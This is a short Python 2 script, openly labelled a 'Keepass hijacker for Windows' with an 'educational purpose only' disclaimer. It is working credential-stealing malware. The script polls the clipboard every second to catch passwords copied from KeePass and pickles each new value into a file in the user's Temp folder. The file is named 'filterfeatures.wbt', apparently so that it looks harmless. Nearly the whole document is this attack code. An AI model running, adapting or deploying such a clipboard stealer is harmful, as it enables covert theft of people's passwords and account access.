#!/usr/bin/env python
#-*- coding: utf-8 -*-

#==========================
#= Written by lutzenfried =
#==========================
#Use for educational purpose only

#Keepass hijacker for Windows
#Dump clipboard storage, using when copy password to keepass manager
#On linux machine you have to copie/past https://pypi.python.org/packages/5b/06/86e3c6a55cacef0e4ec7c25379ff7fcd1a88fd939ecefd442b535c792fa4/pyperclip-1.6.0.tar.gz#md5=d2f6a3129cd6f2518b52bb0b8deeeda7
#On Windows machine you have to copie/past https://pypi.python.org/pypi/pyperclip/1.5.1
#To the python directory C:\Python26\Lib\site-packages\

import pyperclip
import time
import pickle
import os

liste1 = []
path = os.getenv('LOCALAPPDATA')
windowsPath = path + "\Temp"
print "Hijacking clipboard, passwords here ==> ", windowsPath

def hijackKeepass():
    while 1:
        #if pyperclip.paste() !='None':
        value = pyperclip.paste()

        if value not in liste1:
            liste1.append(value)
            fpath = os.path.join(windowsPath, "filterfeatures.wbt")#filterfeatures.wbt contains password dump.
            with open(fpath, 'wb') as fichier:
                pickler = pickle.Pickler(fichier)
                pickler.dump(liste1)
        time.sleep(1)
       
if __name__ == '__main__':
    hijackKeepass()
